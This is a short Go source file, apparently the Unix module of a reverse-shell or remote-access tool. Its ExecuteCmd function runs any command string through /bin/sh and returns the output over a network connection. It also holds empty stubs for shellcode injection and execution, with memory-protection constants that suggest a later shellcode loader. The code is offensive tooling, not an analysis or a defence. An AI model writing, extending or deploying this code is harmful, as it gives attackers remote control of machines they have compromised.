// +build linux darwin freebsd !windows

package shell

import (
	"net"
	"os/exec"
)

const (
	PROT_EXEC   = 0x01
	PROT_WRITE  = 0x02
	PROT_READ   = 0x04
	MAP_ANON    = 0x20
	MAP_PRIVATE = 0x02
)

func GetShell() *exec.Cmd {
	cmd := exec.Command("/bin/sh")
	return cmd
}

func ExecuteCmd(command string, conn net.Conn) {
	cmd_path := "/bin/sh"
	cmd := exec.Command(cmd_path, "-c", command)
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}

// Placeholder to not break things.
// Might be implemented later.
func InjectShellcode(encShellcode string) {
	return
}

// Placeholder to not break things.
// Might be implemented later.
func ExecShellcode(shellcode []byte) {
	return
}
